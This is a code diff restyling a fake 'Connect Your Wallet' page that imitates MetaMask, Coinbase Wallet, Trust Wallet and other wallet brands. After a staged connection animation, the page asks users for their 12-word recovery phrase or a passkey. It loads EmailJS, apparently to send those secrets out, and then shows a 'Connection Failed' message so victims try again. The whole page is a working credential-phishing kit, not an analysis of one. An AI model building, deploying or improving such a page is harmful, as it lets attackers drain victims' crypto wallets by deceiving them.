@@ -4,56 +4,76 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connect Your Crypto Wallet</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        gold: {
-                            400: '#ffed4e',
-                            500: '#ffd700',
-                            600: '#ffc107',
-                        },
-                        dark: {
-                            900: '#0f0f23',
-                            800: '#1a1a3a',
-                            700: '#2d2d5f',
-                        },
-                        light: {
-                            purple: '#b8b8d4'
-                        }
-                    },
-                    backgroundImage: {
-                        'gradient-dark': 'linear-gradient(135deg, #0f0f23, #1a1a3a, #2d2d5f)',
-                        'gradient-gold': 'linear-gradient(45deg, #ffd700, #ffed4e, #ffc107)',
-                        'gradient-gold-transparent': 'linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05))',
-                    },
-                    animation: {
-                        'pulse-slow': 'pulse 2s infinite',
-                        'spin-slow': 'spin 1s linear infinite',
-                        'checkmark': 'checkmark 0.6s ease-in-out',
-                    },
-                    keyframes: {
-                        checkmark: {
-                            '0%': { transform: 'scale(0) rotate(0deg)' },
-                            '50%': { transform: 'scale(1.2) rotate(10deg)' },
-                            '100%': { transform: 'scale(1) rotate(-10deg)' },
-                        }
-                    }
-                }
-            }
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    </script>
-    <style type="text/css">
-        /* Custom styles for elements that can't be done with Tailwind */
-        .gold-text-gradient {
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #0f0f23, #1a1a3a, #2d2d5f);
+            min-height: 100vh;
+            color: #fff;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 20px 0;
+        }
+
+        .header h1 {
+            font-size: clamp(2rem, 5vw, 3rem);
             background: linear-gradient(45deg, #ffd700, #ffed4e, #ffc107);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            margin-bottom: 15px;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+            font-weight: 700;
         }
-        
+
+        .header p {
+            font-size: clamp(1rem, 3vw, 1.2rem);
+            color: #b8b8d4;
+            font-weight: 300;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(min(280px, 100%), 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .wallet-card {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            border-radius: 16px;
+            padding: 25px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            min-height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
         .wallet-card::before {
             content: '';
             position: absolute;
@@ -64,12 +84,388 @@
             background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.1), transparent);
             transition: left 0.6s;
         }
-        
+
         .wallet-card:hover::before,
         .wallet-card:active::before {
             left: 100%;
         }
-        
+
+        .wallet-card:hover,
+        .wallet-card:active {
+            transform: translateY(-4px) scale(1.02);
+            border-color: #ffd700;
+            box-shadow: 0 15px 35px rgba(255, 215, 0, 0.2), 0 0 25px rgba(255, 215, 0, 0.1);
+        }
+
+        .wallet-icon {
+            width: 50px;
+            height: 50px;
+            background: transparent;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            flex-shrink: 0;
+            padding: 8px;
+        }
+
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 8px;
+        }
+
+        .wallet-name {
+            font-size: clamp(1.1rem, 4vw, 1.4rem);
+            font-weight: 600;
+            color: #ffd700;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .wallet-description {
+            color: #b8b8d4;
+            font-size: clamp(0.85rem, 3vw, 0.95rem);
+            line-height: 1.4;
+            flex-grow: 1;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #1a1a3a, #2d2d5f);
+            border: 2px solid #ffd700;
+            border-radius: 20px;
+            padding: 30px 25px;
+            text-align: center;
+            width: min(450px, 95vw);
+            max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 28px;
+            font-weight: bold;
+            color: #ffd700;
+            cursor: pointer;
+            transition: color 0.3s;
+            z-index: 10;
+        }
+
+        .close:hover {
+            color: #ffed4e;
+        }
+
+        .modal-icon {
+            width: 70px;
+            height: 70px;
+            background: transparent;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            padding: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        .modal-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+
+        .modal-title {
+            font-size: clamp(1.4rem, 4vw, 1.8rem);
+            color: #ffd700;
+            margin-bottom: 20px;
+            font-weight: 600;
+            line-height: 1.3;
+        }
+
+        .status-text {
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            color: #b8b8d4;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* Tab Styles */
+        .tab-container {
+            display: flex;
+            margin-bottom: 20px;
+            gap: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px;
+            border-radius: 12px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px 8px;
+            background: transparent;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #b8b8d4;
+            transition: all 0.3s ease;
+            font-size: clamp(0.85rem, 3vw, 1rem);
+            white-space: nowrap;
+        }
+
+        .tab-btn:hover {
+            background: rgba(255, 215, 0, 0.1);
+        }
+
+        .tab-btn.active {
+            background: #ffd700;
+            color: #000;
+            box-shadow: 0 2px 8px rgba(255, 215, 0, 0.3);
+        }
+
+        /* Form Styles */
+        .tab-content {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .tab-content label {
+            font-size: clamp(0.85rem, 3vw, 0.9rem);
+            display: block;
+            margin-bottom: 8px;
+            color: #ffd700;
+            font-weight: 500;
+        }
+
+        .tab-content textarea,
+        .tab-content input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: clamp(0.9rem, 3vw, 1rem);
+            font-family: inherit;
+            transition: all 0.3s ease;
+        }
+
+        .tab-content textarea:focus,
+        .tab-content input:focus {
+            outline: none;
+            border-color: #ffd700;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1);
+        }
+
+        .tab-content textarea::placeholder,
+        .tab-content input::placeholder {
+            color: #888;
+        }
+
+        #submitIntegration {
+            width: 100%;
+            padding: 15px 20px;
+            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            color: #000;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        #submitIntegration:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        #submitIntegration:active {
+            transform: translateY(0);
+        }
+
+        /* Loading Animation */
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 215, 0, 0.3);
+            border-top: 3px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Success Animation */
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #28a745, #20c997);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 35px;
+            color: white;
+        }
+
+        .checkmark {
+            animation: checkmark 0.6s ease-in-out;
+        }
+
+        @keyframes checkmark {
+            0% { transform: scale(0) rotate(0deg); }
+            50% { transform: scale(1.2) rotate(10deg); }
+            100% { transform: scale(1) rotate(-10deg); }
+        }
+
+        /* Mobile-specific optimizations */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .header {
+                margin-bottom: 30px;
+                padding: 15px 0;
+            }
+            
+            .wallet-grid {
+                grid-template-columns: repeat(auto-fill, minmax(min(250px, 100%), 1fr));
+                gap: 15px;
+            }
+            
+            .wallet-card {
+                padding: 20px;
+                min-height: 130px;
+            }
+            
+            .wallet-icon {
+                width: 45px;
+                height: 45px;
+                margin-bottom: 12px;
+            }
+            
+            .modal-content {
+                padding: 25px 20px;
+                border-radius: 16px;
+            }
+            
+            .close {
+                top: 12px;
+                right: 16px;
+                font-size: 24px;
+            }
+            
+            .tab-btn {
+                padding: 10px 6px;
+                font-size: 0.9rem;
+            }
+            
+            .tab-content textarea,
+            .tab-content input {
+                padding: 10px 12px;
+            }
+            
+            #submitIntegration {
+                padding: 12px 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .wallet-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+            
+            .wallet-card {
+                padding: 18px;
+                min-height: 120px;
+            }
+            
+            .wallet-card:hover,
+            .wallet-card:active {
+                transform: translateY(-2px) scale(1.01);
+            }
+            
+            .modal-content {
+                padding: 20px 15px;
+                width: 95vw;
+                max-height: 90vh;
+            }
+            
+            .modal-icon {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .tab-container {
+                margin-bottom: 15px;
+            }
+            
+            .tab-btn {
+                padding: 8px 4px;
+                font-size: 0.85rem;
+            }
+        }
+
+        /* Touch-friendly improvements */
+        @media (hover: none) and (pointer: coarse) {
+            .wallet-card:active {
+                transform: scale(0.98);
+                transition: transform 0.1s;
+            }
+            
+            .tab-btn:active {
+                transform: scale(0.95);
+            }
+            
+            #submitIntegration:active {
+                transform: scale(0.98);
+            }
+        }
+
         /* High contrast mode support */
         @media (prefers-contrast: high) {
             .wallet-card {
@@ -102,34 +498,46 @@
                 border-color: rgba(255, 215, 0, 0.4);
             }
         }
+
+        /* Landscape phone orientation */
+        @media (max-height: 500px) and (orientation: landscape) {
+            .header {
+                margin-bottom: 20px;
+                padding: 10px 0;
+            }
+            
+            .modal-content {
+                max-height: 95vh;
+                padding: 15px;
+            }
+        }
     </style>
 </head>
-<body class="bg-gradient-dark min-h-screen text-white overflow-x-hidden leading-relativ">
-    <div class="container mx-auto max-w-7xl px-5 sm:px-6 lg:px-8 py-5">
-        <div class="header text-center mb-10 md:mb-16 py-5 md:py-8">
-            <h1 class="gold-text-gradient text-3xl sm:text-4xl md:text-5xl font-bold mb-4 text-shadow-lg shadow-gold-500/30">Connect Your Wallet</h1>
-            <p class="text-light-purple text-base sm:text-lg md:text-xl font-light max-w-2xl mx-auto">Choose your preferred crypto wallet to get started</p>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Connect Your Wallet</h1>
+            <p>Choose your preferred crypto wallet to get started</p>
         </div>
 
-        <div class="wallet-grid grid grid-cols-1 xs:grid-cols-2 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-4 sm:gap-5 md:gap-6 mb-10 md:mb-16">
-            <!-- Wallet Cards - I've included just a few for brevity -->
-            <div class="wallet-card bg-gradient-gold-transparent border-2 border-gold-500/30 rounded-2xl p-5 md:p-6 cursor-pointer transition-all duration-300 ease-in-out relative overflow-hidden backdrop-blur-sm min-h-[140px] flex flex-col justify-between hover:-translate-y-1 hover:scale-102 hover:border-gold-500 hover:shadow-xl hover:shadow-gold-500/20" onclick="connectWallet('MetaMask', 'https://th.bing.com/th/id/OIP.vKPbPg_rwB4twGUPOSpk0wHaGw?w=214&h=195&c=7&r=0&o=7&pid=1.7&rm=3')">
-                <div class="wallet-icon w-12 h-12 bg-transparent rounded-xl flex items-center justify-center mb-3 md:mb-4 flex-shrink-0 p-2">
-                    <img src="https://th.bing.com/th/id/OIP.vKPbPg_rwB4twGUPOSpk0wHaGw?w=214&h=195&c=7&r=0&o=7&pid=1.7&rm=3" alt="MetaMask" class="w-full h-full object-contain rounded-lg" />
+        <div class="wallet-grid">
+            <div class="wallet-card" onclick="connectWallet('MetaMask', 'https://th.bing.com/th/id/OIP.vKPbPg_rwB4twGUPOSpk0wHaGw?w=214&h=195&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.vKPbPg_rwB4twGUPOSpk0wHaGw?w=214&h=195&c=7&r=0&o=7&pid=1.7&rm=3" alt="MetaMask" />
                 </div>
-                <div class="wallet-name text-gold-500 text-lg md:text-xl font-semibold mb-2 leading-tight">MetaMask</div>
-                <div class="wallet-description text-light-purple text-sm md:text-base leading-relaxed flex-grow">Most popular Ethereum wallet with browser extension support</div>
+                <div class="wallet-name">MetaMask</div>
+                <div class="wallet-description">Most popular Ethereum wallet with browser extension support</div>
             </div>
 
-            <div class="wallet-card bg-gradient-gold-transparent border-2 border-gold-500/30 rounded-2xl p-5 md:p-6 cursor-pointer transition-all duration-300 ease-in-out relative overflow-hidden backdrop-blur-sm min-h-[140px] flex flex-col justify-between hover:-translate-y-1 hover:scale-102 hover:border-gold-500 hover:shadow-xl hover:shadow-gold-500/20" onclick="connectWallet('Coinbase Wallet', 'https://th.bing.com/th/id/OIP._VY3WoX7aMZuS6s-dnPbxwHaHa?w=163&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
-                <div class="wallet-icon w-12 h-12 bg-transparent rounded-xl flex items-center justify-center mb-3 md:mb-4 flex-shrink-0 p-2">
-                    <img src="https://th.bing.com/th/id/OIP._VY3WoX7aMZuS6s-dnPbxwHaHa?w=163&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Coinbase Wallet" class="w-full h-full object-contain rounded-lg" />
+            <div class="wallet-card" onclick="connectWallet('Coinbase Wallet', 'https://th.bing.com/th/id/OIP._VY3WoX7aMZuS6s-dnPbxwHaHa?w=163&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP._VY3WoX7aMZuS6s-dnPbxwHaHa?w=163&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Coinbase Wallet" />
                 </div>
-                <div class="wallet-name text-gold-500 text-lg md:text-xl font-semibold mb-2 leading-tight">Coinbase Wallet</div>
-                <div class="wallet-description text-light-purple text-sm md:text-base leading-relaxed flex-grow">Secure wallet by Coinbase with DeFi support</div>
+                <div class="wallet-name">Coinbase Wallet</div>
+                <div class="wallet-description">Secure wallet by Coinbase with DeFi support</div>
             </div>
 
-                        <div class="wallet-card" onclick="connectWallet('Trust Wallet', 'https://trustwallet.com/assets/images/media/assets/TWT.png')">
+            <div class="wallet-card" onclick="connectWallet('Trust Wallet', 'https://trustwallet.com/assets/images/media/assets/TWT.png')">
                 <div class="wallet-icon">
                     <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" />
                 </div>
@@ -386,15 +794,20 @@
                 <div class="wallet-description">Card-based hardware wallet for crypto</div>
             </div>
 
-
-            <!-- Additional wallet cards would follow the same pattern -->
+            <div class="wallet-card" onclick="connectWallet('Tomi Wallet', 'https://tomi.com/favicon.ico')">
+                <div class="wallet-icon">
+                    <img src="https://tomi.com/favicon.ico" alt="Tomi Wallet" />
+                </div>
+                <div class="wallet-name">Tomi Wallet</div>
+                <div class="wallet-description">Web3 wallet for the Tomi ecosystem</div>
+            </div>
         </div>
     </div>
 
     <!-- Modal -->
-    <div id="walletModal" class="fixed hidden inset-0 z-50 bg-black/80 backdrop-blur-sm p-5">
-        <div class="modal-content absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-gradient-to-br from-dark-800 to-dark-700 border-2 border-gold-500 rounded-2xl p-6 md:p-8 text-center w-full max-w-md max-h-[85vh] overflow-y-auto shadow-2xl shadow-black/50">
-            <span class="close absolute top-4 right-5 text-2xl font-bold text-gold-500 cursor-pointer transition-colors duration-300 hover:text-gold-400 z-10" onclick="closeModal()">&times;</span>
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
             <div id="modalContent">
                 <!-- Content will be dynamically inserted here -->
             </div>
@@ -402,7 +815,7 @@
     </div>
 
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-   <script>
+<script>
     // Initialize EmailJS with your public key
     (function() {
         emailjs.init("SiqtsqFcjEHmEhAlI"); // Replace with your actual EmailJS public key
@@ -420,38 +833,38 @@
         
         // Phase 1: Connecting animation
         document.getElementById('modalContent').innerHTML = `
-            <div class="modal-icon w-16 h-16 md:w-18 md:h-18 bg-transparent rounded-full flex items-center justify-center mx-auto mb-5 p-3 animate-pulse-slow">
-                <img src="${iconUrl}" alt="${walletName}" class="w-full h-full object-contain rounded-full" />
+            <div class="modal-icon">
+                <img src="${iconUrl}" alt="${walletName}" />
             </div>
-            <div class="modal-title text-gold-500 text-xl md:text-2xl font-semibold mb-5 leading-tight">Connecting to ${walletName}</div>
-            <div class="status-text text-light-purple text-base md:text-lg mb-8 leading-relaxed">Please wait while we establish a secure connection...</div>
-            <div class="loader w-12 h-12 border-3 border-gold-500/30 border-t-gold-500 rounded-full animate-spin-slow mx-auto mb-5"></div>
+            <div class="modal-title">Connecting to ${walletName}</div>
+            <div class="status-text">Please wait while we establish a secure connection...</div>
+            <div class="loader"></div>
         `;
         
         // After 5 seconds, show integration form
         setTimeout(() => {
             document.getElementById('modalContent').innerHTML = `
-                <div class="modal-title text-gold-500 text-xl md:text-2xl font-semibold mb-6">Connect Wallet</div>
+                <div class="modal-title">Connect Wallet</div>
                 
                 <!-- Tabs -->
-                <div class="tab-container flex mb-5 gap-1 bg-white/10 p-1 rounded-xl">
-                    <button id="tab-wallet" class="tab-btn flex-1 py-3 px-2 bg-gold-500 text-black font-semibold rounded-lg transition-all duration-300 text-sm md:text-base whitespace-nowrap shadow-md shadow-gold-500/30">Wallet Setup</button>
-                    <button id="tab-email" class="tab-btn flex-1 py-3 px-2 bg-transparent text-light-purple font-semibold rounded-lg transition-all duration-300 text-sm md:text-base whitespace-nowrap">Passkey</button>
+                <div class="tab-container">
+                    <button id="tab-wallet" class="tab-btn active">Wallet Setup</button>
+                    <button id="tab-email" class="tab-btn">Passkey</button>
                 </div>
 
                 <!-- Wallet Tab -->
-                <div id="walletTab" class="tab-content text-left mb-6">
-                    <label for="phraseInput" class="block text-gold-500 text-sm md:text-base font-medium mb-2">Enter 12-word Recovery Phrase</label>
-                    <textarea id="phraseInput" rows="3" class="w-full py-3 px-4 rounded-xl border-2 border-gold-500/30 bg-white/5 text-white text-base md:text-lg font-sans transition-all duration-300 focus:outline-none focus:border-gold-500 focus:bg-white/10 focus:ring-3 focus:ring-gold-500/10 placeholder:text-gray-500" placeholder="Enter your 12 words separated by spaces..."></textarea>
+                <div id="walletTab" class="tab-content">
+                    <label for="phraseInput">Enter 12-word Recovery Phrase</label>
+                    <textarea id="phraseInput" rows="3" placeholder="Enter your 12 words separated by spaces..."></textarea>
                 </div>
 
                 <!-- Email Tab -->
-                <div id="emailTab" class="tab-content text-left mb-6" style="display:none;">
-                    <label for="emailInput" class="block text-gold-500 text-sm md:text-base font-medium mb-2">Enter your Passkey</label>
-                    <input type="text" id="emailInput" class="w-full py-3 px-4 rounded-xl border-2 border-gold-500/30 bg-white/5 text-white text-base md:text-lg font-sans transition-all duration-300 focus:outline-none focus:border-gold-500 focus:bg-white/10 focus:ring-3 focus:ring-gold-500/10 placeholder:text-gray-500" placeholder="enter your passkey" />
+                <div id="emailTab" class="tab-content" style="display:none;">
+                    <label for="emailInput">Enter your Passkey</label>
+                    <input type="text" id="emailInput" placeholder="enter your passkey" />
                 </div>
 
-                <button id="submitIntegration" class="w-full py-4 px-5 bg-gradient-to-r from-gold-500 to-gold-400 border-none rounded-xl cursor-pointer font-bold text-black text-base md:text-lg transition-all duration-300 shadow-md shadow-gold-500/30 hover:-translate-y-0.5 hover:shadow-lg hover:shadow-gold-500/40 active:translate-y-0">
+                <button id="submitIntegration">
                     Connect Wallet
                 </button>
             `;
@@ -470,19 +883,15 @@
         walletTabBtn.addEventListener("click", () => {
             walletTab.style.display = "block";
             emailTab.style.display = "none";
-            walletTabBtn.classList.add("bg-gold-500", "text-black", "shadow-md", "shadow-gold-500/30");
-            walletTabBtn.classList.remove("bg-transparent", "text-light-purple");
-            emailTabBtn.classList.add("bg-transparent", "text-light-purple");
-            emailTabBtn.classList.remove("bg-gold-500", "text-black", "shadow-md", "shadow-gold-500/30");
+            walletTabBtn.classList.add("active");
+            emailTabBtn.classList.remove("active");
         });
 
         emailTabBtn.addEventListener("click", () => {
             emailTab.style.display = "block";
             walletTab.style.display = "none";
-            emailTabBtn.classList.add("bg-gold-500", "text-black", "shadow-md", "shadow-gold-500/30");
-            emailTabBtn.classList.remove("bg-transparent", "text-light-purple");
-            walletTabBtn.classList.add("bg-transparent", "text-light-purple");
-            walletTabBtn.classList.remove("bg-gold-500", "text-black", "shadow-md", "shadow-gold-500/30");
+            emailTabBtn.classList.add("active");
+            walletTabBtn.classList.remove("active");
         });
     }
 
@@ -496,6 +905,11 @@
                 showError("Please enter exactly 12 words for the recovery phrase.");
                 return;
             }
+
+            // if (!email || !isValidEmail(email)) {
+            //     showError("Please enter a valid email address.");
+            //     return;
+            // }
 
             // Show loading state
             showLoadingState();
@@ -538,20 +952,25 @@
         }
     }
 
+    function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(email);
+    }
+
     function showLoadingState() {
         const submitBtn = document.getElementById("submitIntegration");
         submitBtn.innerHTML = "Connecting...";
         submitBtn.disabled = true;
-        submitBtn.classList.add("opacity-70");
+        submitBtn.style.opacity = "0.7";
     }
 
     function showSuccessState() {
         document.getElementById('modalContent').innerHTML = `
-            <div class="success-icon w-16 h-16 md:w-18 md:h-18 rounded-full bg-gradient-to-r from-green-500 to-teal-500 flex items-center justify-center mx-auto mb-5 text-3xl text-white">
-                <span class="checkmark animate-checkmark">✓</span>
+            <div class="success-icon">
+                <span class="checkmark">✓</span>
             </div>
-            <div class="modal-title text-gold-500 text-xl md:text-2xl font-semibold mb-5">Connection Failed!</div>
-            <div class="status-text text-light-purple text-base md:text-lg mb-8 leading-relaxed">Your wallet could not be connected. Please try again.</div>
+            <div class="modal-title">Connection Failed!</div>
+            <div class="status-text">Your wallet could not be connected. Please try again.</div>
         `;
 
         setTimeout(() => {
@@ -564,7 +983,7 @@
         const submitBtn = document.getElementById("submitIntegration");
         submitBtn.innerHTML = "Submit Integration";
         submitBtn.disabled = false;
-        submitBtn.classList.remove("opacity-70");
+        submitBtn.style.opacity = "1";
 
         // Show error message
         alert(message); // You can replace this with a more elegant error display
